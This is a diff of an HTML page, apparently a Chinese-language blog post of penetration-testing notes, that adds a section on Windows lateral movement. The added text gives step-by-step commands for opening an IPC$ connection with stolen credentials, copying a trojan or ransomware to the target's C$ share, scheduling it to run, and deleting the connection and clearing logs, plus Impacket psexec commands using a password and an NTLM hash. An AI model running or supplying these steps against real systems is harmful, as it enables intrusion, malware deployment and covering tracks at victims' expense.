@@ -190,7 +190,12 @@
     <li><a href="#本地账户攻击">本地账户攻击</a></li>
     <li><a href="#服务账户攻击">服务账户攻击</a></li>
     <li><a href="#低速口令枚举">低速口令枚举</a></li>
-    <li><a href="#横向移动">横向移动</a></li>
+    <li><a href="#横向移动">横向移动</a>
+      <ul>
+        <li><a href="#ipc横向移动">IPC横向移动</a></li>
+        <li><a href="#哈希传递">哈希传递</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
 </div></div>
@@ -445,8 +450,52 @@
 </span></span></code></pre></div><h2 id="横向移动">
 <a class="header-anchor" href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8"></a>
 横向移动
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">哈希传递:
-</span></span><span class="line"><span class="cl">	适用情况：
+</h2><h3 id="ipc横向移动">
+<a class="header-anchor" href="#ipc%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8"></a>
+IPC横向移动
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">前置条件：
+</span></span><span class="line"><span class="cl">	1.获取对方主机的凭据(账户/口令或者目标账户ntml_hash)。
+</span></span><span class="line"><span class="cl">	2.启用文件和打印共享(139和445)，防火墙未限制，并且未限制默认共享（存在IPC$，C$或其他有权限上传文件的共享目录）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">解释：IPC$(Internet Process Connection)是共享&#34;命名管道&#34;的资源，它是一个用于进程间通信的开放式命名管道，通过提供一个可信的用户名和密码，连接双方可以建立一个安全通道并通过这个通道交换加密数据，从而实现对远程计算机的访问。需要使用目标系统用户的账号密码，使用139、445端口。
+</span></span><span class="line"><span class="cl">	ipc$根本不是一个真实的文件或文件夹，它是 Windows 系统预留的一个“虚拟对讲机”（专业叫法是“命名管道”）。它本身不存储任何数据，而是专门用来给系统内部或网络上的两台电脑“传话”的。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">流程：
+</span></span><span class="line"><span class="cl">	Step 1：建立隐藏通道（建立IPC连接）在自己的机器上执行命令，用窃取的密码与目标内网主机建立管道连接。	
+</span></span><span class="line"><span class="cl">		net use \\目标IP\ipc$ &#34;密码&#34; /user:administrator
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	Step 2：悄悄投递木马（文件传输）通道建好后，把恶意程序（如免杀木马、勒索软件）复制到目标的系统盘默认共享目录中。
+</span></span><span class="line"><span class="cl">		copy 恶意木马.exe \\目标IP\c$
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	Step 3：借壳上线（设置计划任务/服务）直接运行容易被察觉，通常会创建一个“计划任务”或“服务”，设定几分钟后自动执行木马。
+</span></span><span class="line"><span class="cl">		schtasks /create /tn &#34;Update&#34; /tr &#34;C:\木马.exe&#34; /sc once /st 23:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	Step 4：清理痕迹（断开连接）木马成功运行并反弹回Shell后，立刻删除IPC连接，清理日志，开始下一轮的密码抓取和横向扩散。
+</span></span><span class="line"><span class="cl">		net use \\目标IP\ipc$ /del
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">	#建立IPC常见的错误代码
+</span></span><span class="line"><span class="cl">        （1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限
+</span></span><span class="line"><span class="cl">        （2）51：网络问题，Windows 无法找到网络路径
+</span></span><span class="line"><span class="cl">        （3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题
+</span></span><span class="line"><span class="cl">        （4）67：找不到网络名，本地Lanmanworkstation服务未启动或删除ipc$
+</span></span><span class="line"><span class="cl">        （5）1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除
+</span></span><span class="line"><span class="cl">        （6）1326：账号密码错误
+</span></span><span class="line"><span class="cl">        （7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况
+</span></span><span class="line"><span class="cl">        （8）2242：用户密码过期，目标有账号策略，强制定期更改密码
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	使用工具：
+</span></span><span class="line"><span class="cl">	1. Impacket
+</span></span><span class="line"><span class="cl">		适用条件：该工具是一个半交互的横向移动工具，适用于创建Socks代理节点使用;
+</span></span><span class="line"><span class="cl">            https://github.com/fortra/impacket
+</span></span><span class="line"><span class="cl">            Python 3.8.x (pip install impacket)
+</span></span><span class="line"><span class="cl">            python psexec.py administrator:admin!@#45@192.168.3.32
+</span></span><span class="line"><span class="cl">            python psexec.py administrator:admin!@#45@192.168.3.32 ver
+</span></span><span class="line"><span class="cl">            python psexec.py administrator@192.168.3.32 -hashes :518b98ad4178a53695dc997aa02d455c
+</span></span></code></pre></div><p>一般情况下，杀软中存在默认共享访问和RPC调用的限制，所以，若目标有杀软，这条路基本就堵死了。<img src="../../images/image-20260501211511681.png" alt="image-20260501211511681"></p>
+<h3 id="哈希传递">
+<a class="header-anchor" href="#%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92"></a>
+哈希传递
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">	适用情况：
 </span></span><span class="line"><span class="cl">		1. 采用NTML验证的服务，如 WMI(135)、SMB(445)、RDP(3389)、WINRM(5985)等
 </span></span><span class="line"><span class="cl">		2. 已获取本地管理权限。
 </span></span><span class="line"><span class="cl">		
@@ -517,10 +566,10 @@
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;83.3k</span
+          >&nbsp;84.3k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;03:30</span>
+        <span class="icon-coffee">&nbsp;03:32</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -550,7 +599,12 @@
     <li><a href="#本地账户攻击">本地账户攻击</a></li>
     <li><a href="#服务账户攻击">服务账户攻击</a></li>
     <li><a href="#低速口令枚举">低速口令枚举</a></li>
-    <li><a href="#横向移动">横向移动</a></li>
+    <li><a href="#横向移动">横向移动</a>
+      <ul>
+        <li><a href="#ipc横向移动">IPC横向移动</a></li>
+        <li><a href="#哈希传递">哈希传递</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
 </div></div>
